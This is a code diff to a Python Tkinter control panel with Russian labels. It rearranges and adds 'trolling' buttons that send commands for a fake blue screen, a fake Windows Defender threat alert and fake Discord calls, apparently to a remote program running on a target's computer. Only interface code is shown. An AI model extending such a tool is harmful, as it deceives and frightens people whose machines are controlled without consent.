@@ -578,14 +578,18 @@ class ModernControlPanel:
         tk.Label(troll_frame, text="Фейковые системные окна, звонки и синий экран со звуком", font=("Segoe UI", 9), bg=self.panel_color, fg="#a6adc8").pack(anchor=tk.W, pady=(0, 8))
 
         row_troll_1 = tk.Frame(troll_frame, bg=self.panel_color)
-        row_troll_1.pack(fill=tk.X, pady=3)
+        row_troll_1.pack(fill=tk.X, pady=2)
         tk.Button(row_troll_1, text="БАТАРЕЯ 5% 🔋", font=("Segoe UI", 9, "bold"), bg="#f38ba8", fg="#11111b", bd=0, command=lambda: self.send_command("TROLL:BATTERY")).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
-        tk.Button(row_troll_1, text="ВХОДЯЩИЙ DISCORD 📞", font=("Segoe UI", 9, "bold"), bg="#5865F2", fg="#ffffff", bd=0, command=lambda: self.send_command("TROLL:DISCORD")).pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=2)
+        tk.Button(row_troll_1, text="УГРОЗА DEFENDER 🛡️", font=("Segoe UI", 9, "bold"), bg="#fab387", fg="#11111b", bd=0, command=lambda: self.send_command("TROLL:DEFENDER")).pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=2)
 
         row_troll_2 = tk.Frame(troll_frame, bg=self.panel_color)
-        row_troll_2.pack(fill=tk.X, pady=3)
-        tk.Button(row_troll_2, text="СИНИЙ ЭКРАН (BSOD) 💻", font=("Segoe UI", 9, "bold"), bg="#0078d7", fg="#ffffff", bd=0, command=lambda: self.send_command("TROLL:BSOD")).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
-        tk.Button(row_troll_2, text="УГРОЗА DEFENDER 🛡️", font=("Segoe UI", 9, "bold"), bg="#fab387", fg="#11111b", bd=0, command=lambda: self.send_command("TROLL:DEFENDER")).pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=2)
+        row_troll_2.pack(fill=tk.X, pady=2)
+        tk.Button(row_troll_2, text="ВХОДЯЩИЙ DISCORD 📞", font=("Segoe UI", 9, "bold"), bg="#5865F2", fg="#ffffff", bd=0, command=lambda: self.send_command("TROLL:DISCORD")).pack(side=tk.LEFT, fill=tk.X, expand=True, padx=2)
+        tk.Button(row_troll_2, text="ДИСКОРД (ТОЛЬКО ЗВУК) 🔊", font=("Segoe UI", 9, "bold"), bg="#7289da", fg="#ffffff", bd=0, command=lambda: self.send_command("TROLL:DISCORD_AUDIO")).pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=2)
+
+        row_troll_3 = tk.Frame(troll_frame, bg=self.panel_color)
+        row_troll_3.pack(fill=tk.X, pady=(4, 2))
+        tk.Button(row_troll_3, text="💥 СИНИЙ ЭКРАН СМЕРТИ (BSOD НА ВЕСЬ ЭКРАН) 💻", font=("Segoe UI", 10, "bold"), bg="#0078d7", fg="#ffffff", bd=0, command=lambda: self.send_command("TROLL:BSOD")).pack(fill=tk.X, expand=True, padx=2)
 
         # ==========================================
         # Вкладка 4: ГАЛЛЮЦИНАЦИИ
@@ -785,6 +789,8 @@ class ModernControlPanel:
             self.troll_header.config(text="ТРОЛЛИНГ: БАТАРЕЯ 5% 🔋", fg="#f38ba8")
         elif command == "TROLL:DISCORD":
             self.troll_header.config(text="ТРОЛЛИНГ: ЗВОНОК DISCORD 📞", fg="#89b4fa")
+        elif command == "TROLL:DISCORD_AUDIO":
+            self.troll_header.config(text="ТРОЛЛИНГ: ЗВОНОК (ТОЛЬКО ЗВУК) 🔊", fg="#7289da")
         elif command == "TROLL:BSOD":
             self.troll_header.config(text="ТРОЛЛИНГ: СИНИЙ ЭКРАН (BSOD) 💻", fg="#89dceb")
         elif command == "TROLL:DEFENDER":
